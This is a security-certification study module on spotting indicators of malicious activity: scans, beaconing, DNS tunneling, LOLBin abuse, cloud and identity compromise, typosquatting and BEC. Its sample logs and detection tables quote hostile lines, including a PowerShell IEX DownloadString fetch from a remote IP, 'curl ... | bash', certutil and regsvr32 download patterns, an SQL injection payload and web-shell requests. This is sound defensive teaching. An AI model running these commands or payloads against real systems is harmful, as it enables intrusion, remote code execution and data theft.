## Exam objective: 1.2

- **1.2** Given a scenario, analyze indicators of potential malicious activity: network-related indicators (rogue devices, enumeration, anomalous activity, activity on unexpected ports), host-related indicators (resource consumption, unauthorized software, suspicious processes, LOLBins, file system changes, data exfiltration, unauthorized configuration), application-, cloud- and identity-related indicators, social engineering (typosquatting, URL shorteners) and email attacks (BEC).

After this module you should be able to:

- recognize what kind of activity is going on from a log excerpt, pcap or description of symptoms;
- distinguish benign noise from an indicator that requires escalation;
- recognize LOLBin abuse and typical Windows and Linux artifacts;
- read cloud and identity indicators (impossible travel, compromised IAM key, cryptomining);
- recognize BEC, typosquatting and shortened URLs in a phishing scenario.

This is a scenario objective: on the exam you get a log, pcap output or a description of behavior and choose what is MOST likely happening or what the next step is. The skill is the same as in the detection lab when you wrote Sigma rules: first you know what normal is, then you look for deviation.

## How to think about indicators

| Term | Meaning | Example |
|---|---|---|
| **IoC** (indicator of compromise) | An artifact indicating that a compromise has already occurred | Malware hash, C2 server IP |
| **IoA** (indicator of attack) | Behavior indicating an attack in progress | A Word process launches PowerShell |
| **Baseline** | The measured normal state | A server sends an average of 200 MB per day |
| **Anomaly** | A deviation from the baseline | The same server sends 40 GB at 3 a.m. |

Not every anomaly is an attack: a backup, patch day or a new release changes the picture. That is why an anomaly is always checked against context (change management, system owner, time).

## Network-related indicators

### Rogue devices

A **rogue device** is an unauthorized device on the network: a Raspberry Pi behind a printer, a personal router, a **rogue access point** or an **evil twin** (an AP with the same SSID as the corporate one). Indicators:

- a new MAC address with an unknown OUI vendor in DHCP or switch logs;
- two DHCP servers in the same segment (a rogue DHCP hands out a fake gateway/DNS);
- the same SSID advertised from an unknown BSSID;
- a device without an EDR agent and without a CMDB record.

```text
Oct 16 09:02:11 dhcp01 dhcpd: DHCPACK on 10.0.5.77 to b8:27:eb:4a:91:0c (raspberrypi) via eth1
```

`b8:27:eb` is the Raspberry Pi Foundation's OUI: on an office network without an approved IoT project it is worth checking. Defense: **802.1X/NAC**, port security, comparison with inventory.

### Enumeration

**Enumeration** is gathering information about the network, services and accounts: ping sweep, port scan, DNS zone transfer, LDAP queries for all users, SMB share enumeration. The indicator is the pattern **one source → many destinations or ports in a short time**:

```bash
$ tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" \
    -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn | head
      1 10.0.5.77   21
      1 10.0.5.77   22
      1 10.0.5.77   23
      1 10.0.5.77   25
...
$ tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0 && ip.src==10.0.5.77" | wc -l
1000
```

A single address sending SYN to 1000 different ports without completing the handshake is a **SYN (half-open) scan**. A horizontal sweep (the same port, many hosts, e.g., 445 across an entire /24) indicates a search for the next target or a worm.

| Pattern | What it is |
|---|---|
| One host, many ports | Vertical port scan |
| Many hosts, one port | Horizontal sweep (service discovery, worm propagation) |
| ICMP echo to an entire subnet | Ping sweep (host discovery) |
| `AXFR` query from a workstation | DNS zone transfer attempt |
| Thousands of LDAP `(objectClass=user)` queries | AD enumeration (BloodHound-type tool) |

### Anomalous activity

- **Beaconing**: regular connections to the same destination at fixed intervals (e.g., every 60 s ± jitter), small and uniform in size. Typical of C2.
- **Traffic spikes**: a sudden jump in volume, especially outbound (exfiltration) or inbound (DDoS).
- **Irregular peer-to-peer**: workstations communicate directly with each other over SMB/RDP/WinRM, which indicates lateral movement.
- **DNS anomalies**: very long subdomains with random characters (**DNS tunneling**), many NXDOMAIN responses (**DGA** malware searching for an active domain), high-volume TXT queries.

```bash
$ tshark -r capture.pcap -Y "ip.dst==198.51.100.23" -T fields -e frame.time_relative -e frame.len
12.004   154
72.011   154
132.009  154
192.015  154
```

An interval of ~60 s and identical packet size: a classic **beacon**.

```bash
$ tshark -r capture.pcap -Y dns.qry.name -T fields -e dns.qry.name | awk '{print length, $0}' | sort -rn | head -2
63 aGVsbG8gd29ybGQgdGhpcyBpcyBleGZpbHRyYXRpb24.t.example-cdn.net
61 c2VjcmV0IGRhdGEgZnJvbSBzZXJ2ZXIgMTAgMSA1IDc.t.example-cdn.net
```

Base64-like subdomains of maximum label length (63 characters) to the same domain mean **DNS tunneling**/exfiltration.

### Activity on unexpected ports

A service on a nonstandard port (SSH on 2222, HTTP on 8443 from a workstation) or a known protocol on the wrong port (TLS on 53, IRC on 6667) is not proof by itself, but it deviates from the baseline. Ask: should the host be listening on that port, and does the protocol match the port?

```bash
$ ss -tlnp
State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process
LISTEN 0      128    0.0.0.0:22         0.0.0.0:*     users:(("sshd",pid=612))
LISTEN 0      5      0.0.0.0:4444       0.0.0.0:*     users:(("nc",pid=8812))   ← netcat listener
```

> **On the exam:** Regular intervals + same size = **beaconing (C2)**. Long random subdomains = **DNS tunneling**. Many NXDOMAIN = **DGA**. Many ports from one source = **scan/enumeration**. Workstation → workstation over SMB/RDP = **lateral movement**.

## Host-related indicators

### Resource consumption

Unexplained consumption of CPU, memory, disk or network:

- CPU constantly at 100% with a suspiciously named process → **cryptominer**;
- the disk fills up rapidly and files get a new extension → **ransomware** in progress;
- free memory disappearing → a memory leak or a malicious process;
- a disk full of archives (`.7z`, `.rar`) in `C:\PerfLogs` or `/tmp` → **staging** before exfiltration.

```bash
$ top -b -n1 | head -12
  PID USER     %CPU %MEM COMMAND
 9921 www-data 398.0  2.1 kswapd0          ← a "kernel" process running as www-data
```

The real `kswapd0` is a kernel thread (owned by root, shown in `ps` as `[kswapd0]`). The same name under the `www-data` user is a masqueraded miner.

### Unauthorized software and unauthorized configuration

- **Unauthorized software**: remote access tools (AnyDesk, ngrok) not approved by IT, credential dumping tools, scanners, portable applications in the user profile. Detection: software inventory, **application allow-listing** (AppLocker, WDAC), EDR.
- **Unauthorized configuration**: Defender disabled (`Set-MpPreference -DisableRealtimeMonitoring $true`), exclusions added to the antivirus, a firewall rule that opens RDP, a modified `hosts` file, a new local admin, a modified audit policy. This is compared with the **baseline configuration** (GPO, CIS, IaC drift).

```text
EventID 5001  Microsoft-Windows-Windows Defender/Operational
Real-time Protection is disabled.
EventID 4720  A user account was created.  Account Name: helpdesk$
EventID 4732  A member was added to a security-enabled local group.  Group: Administrators
```

### Suspicious or rogue processes

Signals (see also the normal process tree in module 1):

- the wrong parent (Office → `cmd.exe`/`powershell.exe`, `w3wp.exe` → `cmd.exe` = web shell);
- a system name on the wrong path or with a typo (`scvhost.exe`, `lsasss.exe`);
- a process without a signature, without a file on disk or with a deleted binary;
- a process that opens a network connection when it shouldn't (e.g., `notepad.exe` to the internet).

### LOLBins and scripts

**Living Off the Land Binaries (LOLBins)** are legitimate, signed OS tools that an attacker uses to evade detection (catalog: the LOLBAS project for Windows, GTFOBins for Linux). The indicator is not the tool itself but its **unusual use**.

| Tool | Normal use | Suspicious pattern |
|---|---|---|
| `powershell.exe` | Administration | `-enc` (Base64), `-w hidden`, `IEX (New-Object Net.WebClient).DownloadString(...)` |
| `certutil.exe` | Working with certificates | `-urlcache -f http://...` (file download), `-decode` |
| `mshta.exe` | HTML applications | Runs an `.hta` from a URL |
| `rundll32.exe` | Loading a DLL | A DLL from `%TEMP%` or a javascript: argument |
| `regsvr32.exe` | COM registration | `/i:http://... scrobj.dll` |
| `bitsadmin.exe` | File transfer | Download from an unknown domain |
| `wmic.exe` | Management | `process call create` on a remote host |
| `curl`/`wget` + `bash` (Linux) | Downloading | `curl http://x/s.sh \| bash` from a web service |

```text
EventID 4104 (PowerShell Script Block Logging)
ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')
ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
```

> **On the exam:** A legitimate, signed Windows tool that downloads or decodes content from the internet (certutil, mshta, regsvr32, bitsadmin) is a **LOLBin** technique. Signature-based antivirus is weak here; **EDR, Script Block Logging and allow-listing** help.

### File system changes

- new files in `%TEMP%`, `%APPDATA%`, `C:\ProgramData`, `/tmp`, `/dev/shm`;
- mass extension changes and the appearance of `README_DECRYPT.txt` → ransomware;
- modified system binaries (hash checking, FIM: Wazuh syscheck as in the detection lab);
- **timestomping**: a file's modification time deliberately set in the past (a mismatch between `$STANDARD_INFORMATION` and `$FILE_NAME` in NTFS);
- **Alternate Data Streams** (`file.txt:hidden.exe`) on NTFS.

### Data exfiltration

Indicators: a large outbound transfer to an unusual destination (personal cloud storage, a new domain), transfer outside working hours, password-protected archives, use of `rclone`, `scp`, DNS/ICMP tunnels, upload over HTTPS to a file-sharing service. Look at the sent/received ratio: an ordinary user receives much more than they send.

## Application-related indicators

- **Service disruption**: the application stops responding, restarts, returns 500 errors. Causes can be DoS, an exploit that crashes the process, ransomware or a malicious configuration change.
- **Anomalous activity**: new admin accounts in the application, unexpected output (database errors in the HTTP response), outbound connections from the application server, unusual requests in the log.

```text
203.0.113.45 - - [16/Oct/2026:09:14:22 +0000] "GET /products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 1243
203.0.113.45 - - [16/Oct/2026:09:14:25 +0000] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 12
```

The first line is an **SQL injection** attempt, the second is a **web shell** in the upload folder. Next step: check the web server's process tree and outbound connections.

## Cloud-related indicators

- **Anomalous activity**: API calls from a new country or ASN, a series of `ListBuckets`/`GetSecretValue` from a single key (reconnaissance), `StopLogging`/`DeleteTrail`, disabling GuardDuty, creating a new IAM user or access key, publicly sharing a snapshot or bucket.
- **Resource compromise**: a compromised instance or account running **cryptomining** (a sudden cost increase, GPU instances in regions you don't use), a container connecting to a mining pool, a Lambda sending spam.

```json
{
  "eventName": "RunInstances",
  "awsRegion": "ap-southeast-3",
  "userIdentity": {"type": "IAMUser", "userName": "ci-deploy", "accessKeyId": "AKIA...7QX"},
  "sourceIPAddress": "185.220.101.4",
  "requestParameters": {"instanceType": "p4d.24xlarge", "minCount": 20}
}
```

A CI service account launching 20 GPU instances in an unused region from a Tor exit node: a compromised key and resource compromise for mining.

## Identity-related indicators

- **IAM account compromise**: a sign-in from a new location and a new device, followed by registration of a new MFA method, creation of inbox rules, a password change or adding an access key. A series of failed sign-ins to many accounts with one password = **password spraying**; many attempts against one account = **brute force**; many consecutive MFA push requests = **MFA fatigue**.
- **Unauthorized access**: access to a resource outside one's role (an accountant reading a code repository), use of a former employee's account, a service account signing in interactively, privilege escalation (Event 4672 for a non-admin account).
- **Impossible travel**: two successful sign-ins from locations too far apart for the elapsed time (Belgrade at 09:00, São Paulo at 09:40). Before escalating, rule out VPN, cloud proxy and mobile networks with incorrect geolocation.

```text
TimeGenerated         UserPrincipalName      IPAddress        Location   ResultType
2026-10-16 09:01:12   m.petrovic@corp.ba     91.185.x.x       BA         0
2026-10-16 09:38:47   m.petrovic@corp.ba     177.54.x.x       BR         0
2026-10-16 09:39:30   m.petrovic@corp.ba     177.54.x.x       BR         0  (Add MFA method)
```

| Windows Event ID | Meaning | Indicator when |
|---|---|---|
| 4624 / 4625 | Successful / failed logon | Many 4625 followed by 4624 (brute force succeeded); Logon Type 10 (RDP) from an unexpected source |
| 4648 | Logon with explicit credentials | Lateral movement (runas, PsExec) |
| 4672 | Special privileges assigned | An account that should not be an admin |
| 4720 / 4732 | Account created / added to a group | A new admin outside the change process |
| 4769 | Kerberos service ticket | Many requests with RC4 encryption = **Kerberoasting** |
| 1102 | Security log cleared | Covering tracks |

> **On the exam:** **Impossible travel** is an indicator, not a verdict: check VPN and proxy first. A sign-in followed by **registration of a new MFA method** or an **inbox rule** is a strong sign of account takeover and requires resetting sessions and credentials.

## Social engineering and email

### Typosquatting and URL shorteners

- **Typosquatting**: a domain with a typo or look-alike characters: `micros0ft.com`, `rnicrosoft.com` (rn instead of m), `paypa1.com`, homoglyphs from other scripts (Cyrillic "а" in `аpple.com`, shown as `xn--pple-43d.com` in punycode), a different TLD (`corp.co` instead of `corp.com`).
- **URL shorteners** (bit.ly and similar) hide the final destination. The analyst expands the link without clicking (a preview service, `curl -sI` in a sandbox and reading the `Location` header) and checks the reputation of the final domain.

```bash
$ curl -sI https://bit.ly/3xYzAbc | grep -i location
location: https://login.micros0ft-support.com/owa/?session=...
```

### Business email compromise (BEC)

**BEC** is fraud without malware: the attacker impersonates an executive, supplier or lawyer and requests a payment or a bank account change. Variants: a fake CEO (CEO fraud), a compromised mailbox of a real supplier (**vendor email compromise**), a fake invoice. Indicators:

- urgency, secrecy, bypassing the usual procedure ("don't call, I'm in a meeting");
- `Reply-To` differs from `From`; a domain similar to the real one (typosquatting);
- SPF/DKIM/DMARC `fail` or a domain registered a few days ago;
- in a compromised mailbox: an **inbox rule** that moves or deletes messages containing words like "invoice", "payment".

```text
From: "Ana Kovač, CEO" <ana.kovac@corp-ba.com>
Reply-To: ana.kovac.ceo@gmail.com
Authentication-Results: spf=fail smtp.mailfrom=corp-ba.com; dkim=none; dmarc=fail action=quarantine
Subject: Urgent - supplier payment today
```

> **On the exam:** BEC is not stopped by antivirus because there is no attachment or link. The best controls are an **out-of-band verification procedure** (a call to a known number before changing an account), **DMARC with p=reject**, tagging external messages and training the finance team.

## Connecting indicators: an example chain

A single indicator is weak; a chain is strong. Here is what a compromise of a Linux web server looks like in the logs, from the first trace to the last:

```text
09:14:22  nginx access   POST /upload.php  200          ← file upload
09:14:25  nginx access   GET /uploads/x.php?c=id  200   ← web shell (application indicator)
09:14:31  auditd         execve uid=33 exe=/usr/bin/curl a1="http://198.51.100.23/m"  ← download
09:14:33  auditd         execve uid=33 exe=/tmp/.m/kswapd0                ← process from /tmp, fake name
09:15:00  netflow        10.0.1.20 → 198.51.100.23:3333  every 60 s       ← beaconing / mining pool
09:20:00  node_exporter  CPU 100% on all 4 cores                          ← resource consumption
```

The same event observed from different angles gives **multiple sources for the same story**, which raises confidence in the conclusion and makes escalation easier.

## Benign or malicious: quick triage

| Observation | Benign explanation to rule out | How to check |
|---|---|---|
| Impossible travel | Corporate VPN, cloud proxy, mobile network | ASN and IP address type, other users from the same IP |
| Port scan from an internal host | Approved vulnerability scanner | List of approved scanners, scan schedule |
| Large outbound transfer at night | Backup or replication | Destination, change management, service owner |
| `certutil -urlcache` | Rarely legitimate (CRL download) | Destination URL, parent process, user |
| CPU 100% | Build, indexing, patching | Process name and path, signature, network connections |
| New local admin | Helpdesk request | Ticket, who created the account, time |
| Sign-in from a new country | Business trip | Calendar/HR, device, MFA method |

> **On the exam:** A question with "What should the analyst do FIRST?" after a single indicator usually expects **validation and gathering context** (checking the baseline, the owner, the change ticket), not shutting the system down right away, unless the scenario clearly shows active damage (e.g., file encryption in progress).

## Summary

- An indicator is read against the **baseline**; an anomaly requires context before escalation.
- Network: **rogue device** (new MAC, rogue DHCP/AP), **enumeration** (one source, many ports/hosts), **beaconing** (regular intervals), **DNS tunneling/DGA**, unexpected ports and peer-to-peer traffic.
- Host: unexplained **resource consumption** (miner, ransomware), **unauthorized software and configuration** (Defender disabled, new admin), processes with the wrong parent or path, **LOLBins** (certutil, mshta, PowerShell `-enc`), file system changes and **exfiltration**.
- Application: service disruption, SQLi and web shell in the access log, unexpected outbound connections.
- Cloud: API calls from unusual locations, disabling logging, **resource compromise** for mining.
- Identity: **impossible travel**, spraying vs. brute force, MFA fatigue, a new MFA method and inbox rules after sign-in, key Event IDs (4624/4625/4672/4720/4769/1102).
- **Typosquatting** and **URL shorteners** hide the real destination; **BEC** is malware-free fraud stopped by procedures and DMARC.
